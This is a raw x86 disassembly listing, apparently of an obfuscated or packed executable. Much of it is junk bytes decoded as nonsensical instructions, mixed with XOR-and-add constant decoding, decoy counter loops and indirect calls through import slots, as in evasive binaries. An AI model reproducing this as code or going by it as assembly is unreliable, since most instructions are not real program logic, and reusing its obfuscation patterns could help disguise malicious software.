  404b9d:	fisttp WORD PTR [ebx-0x37dcefb3]
  404ba3:	or     ecx,0x81161d8f
  404ba9:	jmp    0x404ce9
  404bae:	in     al,dx
  404baf:	xchg   ebx,eax
  404bb0:	imul   eax,esp,0x7b
  404bb3:	les    esp,FWORD PTR [ebx-0x55]
  404bb6:	jmp    0x922ccde5
  404bbb:	and    BYTE PTR [ebp+0x78],ah
  404bbe:	jno    0x404bd2
  404bc0:	jl     0x404c3e
  404bc2:	adc    DWORD PTR [edi+0x7c],edi
  404bc5:	jl     0x404bba
  404bc7:	mov    bl,dl
  404bc9:	add    ebx,ebp
  404bcb:	mov    bl,0xce
  404bcd:	adc    DWORD PTR [ebx-0x2e8cc3e],esp
  404bd3:	xchg   esi,eax
  404bd4:	arpl   WORD PTR [edx-0x746ded47],cx
  404bda:	or     cl,BYTE PTR [ebp-0x73]
  404bdd:	inc    ecx
  404bde:	jnp    0x404c48
  404be0:	fdiv   DWORD PTR [edi]
  404be2:	mov    ebp,DWORD PTR [ebp+0x4b]
  404be5:	cmp    DWORD PTR [ebx],esi
  404be7:	addr16 mov eax,ds:0x7493
  404beb:	lock mov DWORD PTR [eax-0x75],ebx
  404bef:	outs   dx,DWORD PTR ds:[esi]
  404bf0:	mov    esp,0x584a2c30
  404bf5:	aas    
  404bf6:	fstp   QWORD PTR ds:0x9df31adc
  404bfc:	push   edi
  404bfd:	leave  
  404bfe:	and    eax,0x17f1801
  404c03:	stc    
  404c04:	mov    WORD PTR [esi+0x270933e],fs
  404c0a:	call   0x98372103
  404c0f:	lea    ecx,[ebx+0x30]
  404c12:	enter  0x6c06,0xeb
  404c16:	mov    BYTE PTR [ebp-0x3f],ch
  404c19:	shl    BYTE PTR [edx+0x4130c811],cl
  404c1f:	icebp  
  404c20:	in     al,0xbd
  404c22:	inc    edx
  404c23:	xchg   edx,eax
  404c24:	mov    al,bl
  404c26:	fst    QWORD PTR [esi-0x6]
  404c29:	mov    esp,0x96c834f9
  404c2e:	add    ebx,DWORD PTR [ecx]
  404c30:	ret    0x18b2
  404c33:	pop    ecx
  404c34:	cwde   
  404c35:	add    eax,0xa71fba3e
  404c3a:	es test eax,0x1e02c31a
  404c40:	arpl   WORD PTR [esi],ax
  404c42:	push   0x7d41e2c7
  404c47:	cmp    dh,al
  404c49:	xchg   ecx,eax
  404c4a:	ret    0xe85d
  404c4d:	scas   al,BYTE PTR es:[edi]
  404c4e:	call   0x625f:0x595d3dd6
  404c55:	loop   0x404bdb
  404c57:	jg     0x404c4b
  404c59:	mov    ebx,0xd445f58a
  404c5e:	cwde   
  404c5f:	in     al,0xb4
  404c61:	push   0xffffff88
  404c63:	inc    edi
  404c64:	repz jo 0x404ca8
  404c67:	dec    eax
  404c68:	mov    ah,BYTE PTR [esp+ebp*1-0x51]
  404c6c:	in     al,0x2d
  404c6e:	ror    DWORD PTR [edx-0x4b],1
  404c71:	outs   dx,BYTE PTR ds:[esi]
  404c72:	repnz fmulp st(5),st
  404c75:	mov    bl,0x82
  404c77:	call   0xa1b9:0xf4d53e1c
  404c7e:	jnp    0x404c29
  404c80:	ins    BYTE PTR es:[edi],dx
  404c81:	lods   eax,DWORD PTR ds:[esi]
  404c82:	pusha  
  404c83:	les    esp,FWORD PTR [edx]
  404c85:	aad    0xe7
  404c87:	cmp    eax,0x4698ee69
  404c8c:	and    DWORD PTR [esp+ecx*4+0x2e],esi
  404c90:	xor    ah,BYTE PTR [ebx+0x3118f9c8]
  404c96:	cs sub ebp,ebx
  404c99:	dec    edx
  404c9a:	pusha  
  404c9b:	mov    ?,esi
  404c9d:	push   ecx
  404c9e:	xlat   BYTE PTR ds:[ebx]
  404c9f:	inc    edx
  404ca0:	js     0x404c59
  404ca2:	push   esi
  404ca3:	clc    
  404ca4:	pop    eax
  404ca5:	mov    eax,0x990462dc
  404caa:	(bad)  
  404cab:	pusha  
  404cac:	inc    edi
  404cad:	push   ecx
  404cae:	cli    
  404caf:	pop    ss
  404cb0:	or     edi,DWORD PTR [esi+0x19]
  404cb3:	or     al,0xdb
  404cb5:	shr    BYTE PTR [edx+0x10],1
  404cb8:	jae    0x404cfb
  404cba:	mov    al,BYTE PTR [esi]
  404cbc:	sub    al,0x1e
  404cbe:	sahf   
  404cbf:	stc    
  404cc0:	pop    es
  404cc1:	push   esi
  404cc2:	repnz ins BYTE PTR es:[edi],dx
  404cc4:	sub    DWORD PTR [esi+0x5d],esi
  404cc7:	lods   al,BYTE PTR ds:[esi]
  404cc8:	sub    al,0xf3
  404cca:	test   ecx,esp
  404ccc:	fdiv   DWORD PTR [edi+0x552ae7d3]
  404cd2:	xor    al,BYTE PTR [ecx+edi*1+0x5cf5675]
  404cd9:	(bad)
  404cdc:	rol    BYTE PTR ds:0xab2eb4fb,cl
  404ce2:	sub    ebp,DWORD PTR [ecx+ebp*8]
  404ce5:	int3   
  404ce6:	daa    
  404ce7:	pusha  
  404ce8:	sub    cl,BYTE PTR [ebx+0x18c25dc1]
  404cee:	add    BYTE PTR [ebp-0x75],dl
  404cf1:	in     al,dx
  404cf2:	push   ecx
  404cf3:	add    DWORD PTR ds:0x4292b1,edx
  404cf9:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404d00:	mov    eax,DWORD PTR [ebp-0x4]
  404d03:	and    ecx,ecx
  404d05:	mov    edx,DWORD PTR [ebp+0x10]
  404d08:	mov    DWORD PTR ds:0x4292d5,0x4d89
  404d12:	mov    ecx,0x7510857
  404d17:	xor    eax,ecx
  404d19:	add    eax,0x32729e
  404d1e:	jmp    0x404e84
  404d23:	jne    0x404d9b
  404d25:	xchg   DWORD PTR [ebx+ebx*4],ebx
  404d28:	mov    eax,ds:0x71892dbd
  404d2d:	arpl   WORD PTR [eax],ax
  404d2f:	fidivr DWORD PTR [edx]
  404d31:	test   DWORD PTR ds:0x7c7c1512,ebp
  404d37:	aaa    
  404d38:	jg     0x404db6
  404d3a:	jl     0x404d00
  404d3c:	mov    al,0x8b
  404d3e:	and    eax,0xc2e1409f
  404d43:	pop    eax
  404d44:	cmp    cl,BYTE PTR [esi+0x47]
  404d47:	test   BYTE PTR [ecx-0x5e],dh
  404d4a:	aaa    
  404d4b:	daa    
  404d4c:	cmp    al,BYTE PTR [eax+0x2f]
  404d4f:	push   ebx
  404d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d51:	adc    BYTE PTR [edx-0x1b6b8c7e],ch
  404d57:	fcom   DWORD PTR [eax+0x4e7afe74]
  404d5d:	cmp    al,0x8d
  404d5f:	aas    
  404d60:	xor    DWORD PTR [eax+esi*8],0x54
  404d64:	lock push edx
  404d66:	daa    
  404d67:	cmp    eax,0xd29871f0
  404d6c:	call   DWORD PTR [ecx]
  404d6e:	xchg   ecx,eax
  404d6f:	sti    
  404d70:	pop    esp
  404d71:	adc    edi,DWORD PTR [edx]
  404d73:	inc    eax
  404d74:	sbb    eax,0x96548e81
  404d79:	fdiv   QWORD PTR [ecx-0x70]
  404d7c:	not    DWORD PTR [edx]
  404d7e:	and    eax,0xfa484efb
  404d83:	sbb    al,0xe6
  404d85:	retf   
  404d86:	push   ecx
  404d87:	mov    bl,0xbd
  404d89:	or     BYTE PTR [esi+0x8],0xc4
  404d8d:	mov    al,0xf4
  404d8f:	(bad)  
  404d90:	retf   0x2bfe
  404d93:	out    0x16,eax
  404d95:	inc    edi
  404d96:	jae    0x404d67
  404d98:	dec    ebp
  404d99:	repz js 0x404d7e
  404d9c:	dec    ecx
  404d9d:	addr16 mov ds:0xa617,al
  404da1:	push   ds
  404da2:	xchg   BYTE PTR [ecx+0x779b0e28],bl
  404da8:	or     eax,0x4e5e895
  404dad:	addr16 test eax,0xfaacdc8c
  404db3:	mov    ds:0x7b0d7bae,al
  404db8:	mov    bh,0xc0
  404dba:	sahf   
  404dbb:	fnsave [edi+0x2249dc89]
  404dc1:	neg    DWORD PTR [ebx+0x23]
  404dc4:	mov    ecx,DWORD PTR [edi]
  404dc6:	int    0x22
  404dc8:	sub    ecx,edx
  404dca:	fsub   QWORD PTR [eax+0x592f8707]
  404dd0:	sub    eax,0x2738cef3
  404dd5:	push   cs
  404dd6:	cwde   
  404dd7:	xor    eax,0xfa8a21f2
  404ddc:	daa    
  404ddd:	jmp    FWORD PTR [ebx]
  404ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404de0:	scas   al,BYTE PTR es:[edi]
  404de1:	sbb    al,0xcd
  404de3:	cdq    
  404de4:	mov    ds:0x7692011b,eax
  404de9:	icebp  
  404dea:	not    DWORD PTR [edx+ecx*1-0x50]
  404dee:	outs   dx,BYTE PTR ds:[esi]
  404def:	and    BYTE PTR [edx+edi*8+0x1d],bl
  404df3:	sub    DWORD PTR [ecx-0x11798abc],ebp
  404df9:	jb     0x404d81
  404dfb:	mov    bh,0x38
  404dfd:	stc    
  404dfe:	ffree  st(4)
  404e00:	xchg   edx,eax
  404e01:	into   
  404e02:	xchg   ebp,eax
  404e03:	xor    DWORD PTR [esi],esp
  404e05:	add    cl,BYTE PTR [ebx-0x34]
  404e08:	mov    al,0x48
  404e0a:	lods   eax,DWORD PTR ds:[esi]
  404e0b:	mov    cl,0xea
  404e0d:	arpl   WORD PTR [edx+0x24d3b406],bx
  404e13:	(bad)  [ebx]
  404e15:	std    
  404e16:	or     eax,0x68678a16
  404e1b:	mov    eax,ds:0xd1ed5a01
  404e20:	fucomip st,st(1)
  404e22:	mov    al,0x8f
  404e24:	inc    eax
  404e25:	push   edi
  404e26:	icebp  
  404e27:	xchg   ecx,eax
  404e28:	xchg   ecx,eax
  404e29:	out    0xf,al
  404e2b:	out    0xe2,eax
  404e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e2e:	mov    ds,WORD PTR [ebx+0x36]
  404e31:	test   al,0x47
  404e33:	xlat   BYTE PTR ds:[ebx]
  404e34:	pushf  
  404e35:	adc    BYTE PTR [ecx],bl
  404e37:	jge    0x404e24
  404e39:	imul   edx,DWORD PTR [eax+ecx*1],0x5c33a111
  404e40:	push   esi
  404e41:	xor    ecx,DWORD PTR [eax+0x2d]
  404e44:	imul   esp,DWORD PTR [ecx+0x64],0x9c093865
  404e4b:	loop   0x404e40
  404e4d:	pop    ebp
  404e4e:	mov    ch,0x5
  404e50:	mov    edi,0x2d2c1a35
  404e55:	push   ds
  404e56:	call   0x3c733663
  404e5b:	lahf   
  404e5c:	add    DWORD PTR [ebp-0x6b],edi
  404e5f:	scas   eax,DWORD PTR es:[edi]
  404e60:	pop    edx
  404e61:	dec    eax
  404e62:	ja     0x404e4e
  404e64:	lea    ebp,[ebx]
  404e66:	add    WORD PTR [eax+0x75],sp
  404e6a:	(bad)  
  404e6b:	jp     0x404edb
  404e6d:	cs fwait
  404e6f:	xchg   ax,ax
  404e71:	mov    BYTE PTR [eax-0x7b],al
  404e74:	in     al,0x37
  404e76:	inc    esi
  404e77:	retf   
  404e78:	cmp    bl,al
  404e7a:	(bad)  
  404e7b:	mov    ebp,0xce5b529c
  404e80:	mov    ebx,0x89aaa655
  404e85:	add    cl,BYTE PTR [ecx]
  404e87:	sbb    eax,0x4292a9
  404e8c:	mov    eax,DWORD PTR [ebp+0x14]
  404e8f:	not    edx
  404e91:	mov    edx,DWORD PTR [ebp+0x10]
  404e94:	mov    DWORD PTR [edx+0x4],eax
  404e97:	mov    eax,DWORD PTR [ebp+0x18]
  404e9a:	sbb    DWORD PTR ds:0x42c88e,0xab4
  404ea4:	mov    edx,DWORD PTR [ebp+0x10]
  404ea7:	mov    DWORD PTR [edx+0x8],eax
  404eaa:	sub    edx,eax
  404eac:	mov    eax,DWORD PTR [ebp+0x1c]
  404eaf:	mov    edx,DWORD PTR ds:0x4275b0
  404eb5:	and    DWORD PTR ds:0x427594,edx
  404ebb:	jmp    0x405021
  404ec0:	fdiv   DWORD PTR [ebx+0x2e]
  404ec3:	dec    esp
  404ec4:	stc    
  404ec5:	gs jp  0x404e53
  404ec8:	jg     0x404e7d
  404eca:	pushf  
  404ecb:	mov    ecx,0x74378fbf
  404ed0:	in     eax,dx
  404ed1:	adc    al,0x7c
  404ed3:	jl     0x404f0c
  404ed5:	jg     0x404f53
  404ed7:	jl     0x404efd
  404ed9:	xor    ecx,0x17
  404edc:	test   BYTE PTR [esi],0x64
  404edf:	pop    edi
  404ee0:	loop   0x404e68
  404ee2:	jl     0x404ee7
  404ee4:	imul   esi,DWORD PTR [esi+0xb88540d],0xab48c896
  404eee:	xor    DWORD PTR [edx+0x48],edi
  404ef1:	sahf   
  404ef2:	pushf  
  404ef3:	mov    DWORD PTR [ebx],ebx
  404ef5:	jae    0x404f72
  404ef7:	les    ebx,FWORD PTR [edx+edi*4+0x36ae3539]
  404efe:	daa    
  404eff:	and    eax,0xc4c69fa2
  404f04:	mov    al,0xbf
  404f06:	imul   ebp,DWORD PTR [esi],0xffffffdd
  404f09:	inc    ebx
  404f0a:	mov    al,ds:0xc10502a5
  404f0f:	cli    
  404f10:	xchg   esi,eax
  404f11:	lock xor al,BYTE PTR [ebp-0x2301b10b]
  404f18:	dec    esi
  404f19:	bound  eax,QWORD PTR [edx+0x55]
  404f1c:	sbb    DWORD PTR [eax+0x5e819739],ebp
  404f22:	sub    DWORD PTR [edx+0x71],esp
  404f25:	and    al,0xc4
  404f27:	inc    edx
  404f28:	xor    esi,DWORD PTR [ebx+0x18]
  404f2b:	pusha  
  404f2c:	jbe    0x404fa0
  404f2e:	mov    esp,0x1a67a80f
  404f33:	in     al,0xf1
  404f35:	dec    edx
  404f36:	inc    eax
  404f37:	test   eax,0x19c1a220
  404f3c:	pop    edi
  404f3d:	popa   
  404f3e:	jecxz  0x404f63
  404f40:	fdivr  QWORD PTR [ebx+0x2ac81850]
  404f46:	mov    ah,0x9f
  404f48:	int3   
  404f49:	mov    BYTE PTR [ecx-0x3d748ead],bh
  404f4f:	pushf  
  404f50:	inc    esp
  404f51:	mov    ah,0x5f
  404f53:	mov    ecx,0x2a7845ef
  404f58:	cmp    ebx,esp
  404f5a:	(bad)
  404f5d:	retf   0x947e
  404f60:	add    dl,BYTE PTR [eax-0x17]
  404f63:	retf   0x2262
  404f66:	push   ebp
  404f67:	push   ds
  404f68:	mov    ebx,0x1253237a
  404f6d:	cmp    BYTE PTR [esi-0x31],ch
  404f70:	pop    ebp
  404f71:	inc    esp
  404f72:	xor    BYTE PTR [ebx-0x20],ah
  404f75:	pop    esp
  404f76:	pop    ebp
  404f77:	pushf  
  404f78:	xchg   esi,eax
  404f79:	or     edi,DWORD PTR [ecx+esi*1+0x49]
  404f7d:	xor    al,0x7d
  404f7f:	ror    DWORD PTR [bp+si+0x65],1
  404f83:	add    al,0xba
  404f85:	dec    eax
  404f86:	(bad)  
  404f87:	sub    al,BYTE PTR [edi]
  404f89:	pop    ebp
  404f8a:	mov    cl,0x68
  404f8c:	loope  0x404fd4
  404f8e:	push   ecx
  404f8f:	lahf   
  404f90:	dec    ebp
  404f91:	xchg   BYTE PTR [ebp-0x63],bl
  404f94:	lock xchg DWORD PTR [ecx],edi
  404f97:	mov    al,0xdf
  404f99:	lds    ebx,FWORD PTR [ecx-0x55]
  404f9c:	sub    cl,BYTE PTR [ebx+0x14]
  404f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fa0:	imul   BYTE PTR [esi-0x79060746]
  404fa6:	jns    0x404f7a
  404fa8:	mov    dh,0xe8
  404faa:	imul   edi,DWORD PTR [edx-0x1b],0xffffff98
  404fae:	xchg   esp,eax
  404faf:	enter  0x7046,0x28
  404fb3:	loope  0x405003
  404fb5:	or     eax,0xed71d225
  404fba:	lds    edi,FWORD PTR ds:0x3e5073d9
  404fc0:	fnsave [ecx-0x3f2a1dff]
  404fc6:	lock push ebx
  404fc8:	shl    DWORD PTR [esi+eiz*8+0x21a483b2],0xef
  404fd0:	sti    
  404fd1:	and    DWORD PTR [ecx-0x2d22086e],esp
  404fd7:	mov    ds:0x7466e40d,al
  404fdc:	outs   dx,BYTE PTR ds:[esi]
  404fdd:	mov    eax,0xae85a963
  404fe2:	jle    0x40503a
  404fe4:	cmp    al,0x46
  404fe6:	xchg   esp,eax
  404fe7:	stos   BYTE PTR es:[edi],al
  404fe8:	mov    edi,0x32fb96a8
  404fed:	out    0xa1,al
  404fef:	add    dh,dl
  404ff1:	fsubr  DWORD PTR [eax]
  404ff3:	in     al,dx
  404ff4:	push   es
  404ff5:	mov    eax,0x5ba41fd4
  404ffa:	add    DWORD PTR [ebx+0x8335ae9],ebx
  405000:	sbb    DWORD PTR [esi],ecx
  405002:	and    eax,0xb69241c2
  405007:	jl     0x404fdc
  405009:	add    eax,DWORD PTR [ebx-0x33]
  40500c:	scas   eax,DWORD PTR es:[edi]
  40500d:	(bad)  
  40500e:	mov    bh,0x15
  405010:	jns    0x405068
  405012:	scas   al,BYTE PTR es:[edi]
  405013:	xchg   edi,eax
  405014:	neg    DWORD PTR [eax-0x5c96e0da]
  40501a:	jnp    0x405093
  40501c:	shl    BYTE PTR [ebp-0x63],0x6b
  405020:	push   ds
  405021:	mov    edx,DWORD PTR [ebp+0x10]
  405024:	mov    DWORD PTR [edx+0xc],eax
  405027:	adc    DWORD PTR ds:0x427d0f,ebx
  40502d:	mov    eax,DWORD PTR [ebp+0x20]
  405030:	sbb    DWORD PTR ds:0x427598,0x4ffb
  40503a:	jmp    0x4051a0
  40503f:	jno    0x40503e
  405041:	xlat   BYTE PTR ds:[ebx]
  405042:	sti    
  405043:	sti    
  405044:	std    
  405045:	add    eax,0xd7a6c1fd
  40504a:	mov    dl,0xf5
  40504c:	jbe    0x405090
  40504e:	in     eax,0xa4
  405050:	pop    ss
  405051:	jl     0x4050cf
  405053:	aaa    
  405054:	jg     0x4050d2
  405056:	jl     0x40508f
  405058:	sbb    DWORD PTR [ecx-0x492069e5],0xae4cf687
  405062:	in     eax,0xf7
  405064:	stos   DWORD PTR es:[edi],eax
  405065:	dec    ecx
  405066:	adc    eax,0xec262fb0
  40506b:	std    
  40506c:	xlat   BYTE PTR ds:[ebx]
  40506d:	dec    esi
  40506e:	or     al,0x68
  405070:	pusha  
  405071:	dec    ebp
  405072:	popf   
  405073:	inc    esp
  405074:	ja     0x405046
  405076:	adc    al,0x9f
  405078:	mov    esp,0x28483c8
  40507d:	or     eax,0x3754bdc3
  405082:	dec    ecx
  405083:	out    0x48,eax
  405085:	pop    esp
  405086:	lea    ebp,ds:[edi-0x49421e03]
  40508d:	fild   DWORD PTR [ebx-0x4bd360f8]
  405093:	jo     0x405048
  405095:	in     eax,0xbe
  405097:	daa    
  405098:	div    ecx
  40509a:	adc    eax,0x6fc90104
  40509f:	dec    edi
  4050a0:	dec    esp
  4050a1:	push   cs
  4050a2:	addr16 mov eax,0x364e5380
  4050a8:	mov    eax,?
  4050aa:	fld    QWORD PTR [edx]
  4050ac:	and    al,0x9
  4050ae:	loop   0x405043
  4050b0:	pusha  
  4050b1:	(bad)  
  4050b2:	in     eax,0xbe
  4050b4:	pop    edx
  4050b5:	mov    ch,0x43
  4050b7:	jge    0x405113
  4050b9:	add    bh,BYTE PTR [ebx+0x1c]
  4050bc:	inc    ecx
  4050bd:	jbe    0x405051
  4050bf:	cs pop ebp
  4050c1:	and    BYTE PTR [edx],0x2a
  4050c4:	outs   dx,BYTE PTR ds:[esi]
  4050c5:	das    
  4050c6:	push   edi
  4050c7:	xchg   edi,eax
  4050c8:	xchg   ecx,eax
  4050c9:	xor    BYTE PTR [edi-0x3e],al
  4050cc:	sub    eax,DWORD PTR [esi+ecx*1]
  4050cf:	sbb    al,0xb4
  4050d1:	and    esp,DWORD PTR [ecx-0x76]
  4050d4:	xor    al,0xff
  4050d6:	xor    al,0x3
  4050d8:	inc    ecx
  4050d9:	nop
  4050da:	ins    BYTE PTR es:[edi],dx
  4050db:	not    BYTE PTR [esi+0x28950a04]
  4050e1:	adc    esp,DWORD PTR [eax+0x67f94012]
  4050e7:	push   cs
  4050e8:	mov    edi,0x831e705f
  4050ed:	push   0xa6608472
  4050f2:	dec    esi
  4050f3:	or     al,0x13
  4050f5:	xor    ch,bl
  4050f7:	(bad)  
  4050f8:	ds mov ebx,ebp
  4050fb:	fs push edx
  4050fd:	jbe    0x405156
  4050ff:	or     al,0xc
  405101:	xor    al,0x2d
  405103:	out    0x4,eax
  405105:	jne    0x40512d
  405107:	fcom   DWORD PTR [ebx-0x62e4eb5]
  40510d:	pop    DWORD PTR [edi]
  40510f:	jge    0x4050a1
  405111:	shr    ecx,1
  405113:	fst    DWORD PTR [edx]
  405115:	cmp    dh,BYTE PTR [edx+0x1d3659d]
  40511b:	sbb    eax,0x8cb041cb
  405120:	ja     0x40513f
  405122:	(bad)  
  405123:	push   ecx
  405124:	stos   BYTE PTR es:[edi],al
  405125:	aaa    
  405126:	scas   eax,DWORD PTR es:[edi]
  405127:	mov    bh,0xec
  405129:	retf   0x3ddb
  40512c:	bound  esp,QWORD PTR [ecx+0x30]
  40512f:	xlat   BYTE PTR ds:[ebx]
  405130:	aaa    
  405131:	pop    es
  405132:	loope  0x4050f7
  405134:	test   BYTE PTR [esi-0x5eec211c],cl
  40513a:	imul   esi,DWORD PTR [eax+ecx*4-0x3e],0xaacc4c40
  405142:	jp     0x4051ac
  405144:	and    dh,ch
  405146:	cmc    
  405147:	das    
  405148:	cmp    al,0x91
  40514a:	out    dx,al
  40514b:	aaa    
  40514c:	jae    0x40512e
  40514e:	mov    dh,0xbb
  405150:	cmp    eax,0xa590901d
  405155:	or     ch,ch
  405157:	jp     0x40510f
  405159:	retf   
  40515a:	test   eax,0x768adbff
  40515f:	xchg   edi,eax
  405160:	push   0x0
  405162:	sbb    BYTE PTR [ecx],0xc4
  405165:	lahf   
  405166:	retf   
  405167:	adc    BYTE PTR [eax-0x3],ch
  40516a:	pop    esp
  40516b:	or     eax,0xac7ac919
  405170:	repz fdiv DWORD PTR [edi+0x3a2c4c5c]
  405177:	imul   esi,ecx,0xffffffba
  40517a:	mov    eax,0x678a8b26
  40517f:	repz imul ebx,DWORD PTR [ebp-0x60],0x4
  405184:	aad    0xc1
  405186:	mov    edx,0x31b0f624
  40518b:	loope  0x4051ec
  40518d:	into   
  40518e:	jle    0x4051cd
  405190:	and    eax,0x3da5bb74
  405195:	mov    ds:0x4392c60e,eax
  40519a:	jo     0x4051b9
  40519c:	out    dx,eax
  40519d:	loop   0x40521d
  40519f:	xlat   BYTE PTR ds:[ebx]
  4051a0:	mov    edx,DWORD PTR [ebp+0x10]
  4051a3:	mov    DWORD PTR [edx+0x10],eax
  4051a6:	mov    eax,eax
  4051a8:	mov    eax,DWORD PTR [ebp+0x14]
  4051ab:	test   eax,eax
  4051ad:	mov    eax,DWORD PTR [ebp+0x8]
  4051b0:	jne    0x4051b9
  4051b6:	mov    eax,DWORD PTR [ebp+0xc]
  4051b9:	xor    eax,ecx
  4051bb:	add    eax,0x32729e
  4051c0:	leave  
  4051c1:	ret    0x1c
  4051c4:	push   ebp
  4051c5:	mov    ebp,esp
  4051c7:	sub    esp,0x10c
  4051cd:	adc    DWORD PTR ds:0x427cff,0x42c892
  4051d7:	push   ebx
  4051d8:	push   esi
  4051d9:	push   edi
  4051da:	push   0x409348
  4051df:	adc    DWORD PTR ds:0x4275a0,0x3f8f
  4051e9:	call   DWORD PTR ds:0x427cab
  4051ef:	test   eax,eax
  4051f1:	mov    DWORD PTR ds:0x427594,0x1688
  4051fb:	je     0x405208
  405201:	xor    eax,eax
  405203:	jmp    0x4063e6
  405208:	and    DWORD PTR ds:0x4292a5,0x4292c9
  405212:	push   0x4092b4
  405217:	adc    DWORD PTR ds:0x4292cd,0x1b3a
  405221:	call   DWORD PTR ds:0x427a33
  405227:	and    DWORD PTR ds:0x427d07,0x4292c5
  405231:	test   ax,ax
  405234:	mov    DWORD PTR ds:0x42c882,0x6514
  40523e:	je     0x40526d
  405244:	push   0x3546
  405249:	push   0x65890909
  40524e:	or     DWORD PTR ds:0x42c882,0x42c89a
  405258:	call   DWORD PTR ds:0x4279ef
  40525e:	mov    DWORD PTR ds:0x4292dd,0x79a2
  405268:	jmp    0x4063e6
  40526d:	mov    ecx,0xf89c8535
  405272:	mov    DWORD PTR [ebp-0x20],ecx
  405275:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  40527c:	sub    ebx,edx
  40527e:	lea    eax,[ebp-0x58]
  405281:	neg    esi
  405283:	mov    DWORD PTR [ebp-0x60],eax
  405286:	and    DWORD PTR ds:0x4292c1,0x0
  405290:	mov    edx,DWORD PTR ds:0x4292c1
  405296:	inc    edx
  405297:	mov    DWORD PTR ds:0x4292c1,edx
  40529d:	cmp    DWORD PTR ds:0x4292c1,0x1e
  4052a4:	jne    0x4052bd
  4052aa:	push   0x63b5
  4052af:	push   DWORD PTR [ebp-0x28]
  4052b2:	push   0x5536
  4052b7:	call   DWORD PTR ds:0x427a97
  4052bd:	cmp    DWORD PTR ds:0x4292c1,0x10
  4052c4:	jb     0x405290
  4052ca:	movzx  ebx,WORD PTR ds:0x42c88a
  4052d1:	adc    DWORD PTR ds:0x4292c1,ebx
  4052d7:	lea    eax,[ebp-0x50]
  4052da:	sbb    ebx,DWORD PTR ds:0x4275b0
  4052e0:	mov    DWORD PTR [ebp-0x10],eax
  4052e3:	mov    eax,ds:0x4091a0
  4052e8:	sbb    ebx,esi
  4052ea:	mov    eax,DWORD PTR [eax+0x1c8]
  4052f0:	and    DWORD PTR ds:0x4275a4,0x0
  4052fa:	mov    esi,DWORD PTR ds:0x4275a4
  405300:	inc    esi
  405301:	mov    DWORD PTR ds:0x4275a4,esi
  405307:	cmp    DWORD PTR ds:0x4275a4,0x4
  40530e:	jne    0x40531f
  405314:	push   0x1257
  405319:	call   DWORD PTR ds:0x4279d7
  40531f:	cmp    DWORD PTR ds:0x4275a4,0x3
  405326:	jne    0x405339
  40532c:	mov    esi,DWORD PTR ds:0x4275a4
  405332:	inc    esi
  405333:	mov    DWORD PTR ds:0x4275a4,esi
  405339:	cmp    DWORD PTR ds:0x4275a4,0x1a
  405340:	jb     0x4052fa
  405346:	sbb    esi,DWORD PTR ds:0x4292dd
  40534c:	mov    eax,DWORD PTR [eax]
  40534e:	mov    edx,DWORD PTR [ebp-0x10]
  405351:	sbb    ebx,0x4bc4
  405357:	mov    esi,0x7510857
  40535c:	xor    eax,esi
  40535e:	and    DWORD PTR ds:0x4292c5,0x0
  405368:	jmp    0x40537c
  40536d:	xor    ebx,ebx
  40536f:	add    ebx,DWORD PTR ds:0x4292c5
  405375:	inc    ebx
  405376:	mov    DWORD PTR ds:0x4292c5,ebx
  40537c:	cmp    DWORD PTR ds:0x4292c5,0x10
  405383:	jae    0x4053d4
  405389:	cmp    DWORD PTR ds:0x4292c5,0xb
  405390:	jne    0x4053af
  405396:	push   0x1343
  40539b:	push   DWORD PTR [ebp-0xc]
  40539e:	push   DWORD PTR [ebp-0x14]
  4053a1:	push   0x4e35
  4053a6:	push   DWORD PTR [ebp-0x28]
  4053a9:	call   DWORD PTR ds:0x4278f7
  4053af:	cmp    DWORD PTR ds:0x4292c5,0xa
  4053b6:	jne    0x4053c9
  4053bc:	mov    ebx,DWORD PTR ds:0x4292c5
  4053c2:	inc    ebx
  4053c3:	mov    DWORD PTR ds:0x4292c5,ebx
  4053c9:	jmp    0x40536d
  4053ce:	adc    ebx,DWORD PTR ds:0x427598
  4053d4:	mov    ebx,0x32729e
  4053d9:	sbb    DWORD PTR ds:0x42c89e,0x427d13
  4053e3:	add    eax,ebx
  4053e5:	mov    DWORD PTR ds:0x4292b9,0x4aac
  4053ef:	mov    DWORD PTR [edx],eax
  4053f1:	mov    eax,ds:0x409464
  4053f6:	mov    DWORD PTR ds:0x42c882,0x6078
  405400:	cmp    eax,0x23d14057
  405405:	mov    eax,DWORD PTR [ebp-0x18]
  405408:	mov    DWORD PTR ds:0x4292dd,0x3967
  405412:	je     0x405434
  405418:	mov    ecx,DWORD PTR [ebp-0x20]
  40541b:	xor    eax,esi
  40541d:	add    eax,ebx
  40541f:	imul   eax,ecx
  405422:	mov    DWORD PTR ds:0x4292c5,0x1be9
  40542c:	mov    DWORD PTR [ebp-0x20],eax
  40542f:	jmp    0x405ffd
  405434:	xor    eax,esi
  405436:	add    eax,ebx
  405438:	mov    DWORD PTR ds:0x42c886,0x19
  405442:	cmp    DWORD PTR ds:0x42c886,0x0
  405449:	je     0x405480
  40544f:	cmp    DWORD PTR ds:0x42c886,0x23
  405456:	jne    0x405468
  40545c:	push   DWORD PTR [ebp-0x20]
  40545f:	push   DWORD PTR [ebp-0x24]
  405462:	call   DWORD PTR ds:0x427a9b
  405468:	mov    edx,DWORD PTR ds:0x42c886
  40546e:	dec    edx
  40546f:	mov    DWORD PTR ds:0x42c886,edx
  405475:	jmp    0x405442
  40547a:	or     edx,0x41a6
  405480:	mov    ds:0x4092b0,eax
  405485:	mov    eax,DWORD PTR [ebp-0x20]
  405488:	add    edx,DWORD PTR ds:0x42c89a
  40548e:	xor    eax,esi
  405490:	and    edx,0x2762
  405496:	add    eax,ebx
  405498:	and    DWORD PTR ds:0x42c88e,0x0
  4054a2:	jmp    0x4054b4
  4054a7:	mov    edx,DWORD PTR ds:0x42c88e
  4054ad:	inc    edx
  4054ae:	mov    DWORD PTR ds:0x42c88e,edx
  4054b4:	cmp    DWORD PTR ds:0x42c88e,0x1d
  4054bb:	jae    0x405501
  4054c1:	cmp    DWORD PTR ds:0x42c88e,0xd
  4054c8:	jne    0x4054dc
  4054ce:	push   DWORD PTR [ebp-0x18]
  4054d1:	push   0x590a
  4054d6:	call   DWORD PTR ds:0x427a9f
  4054dc:	cmp    DWORD PTR ds:0x42c88e,0xc
  4054e3:	jne    0x4054f6
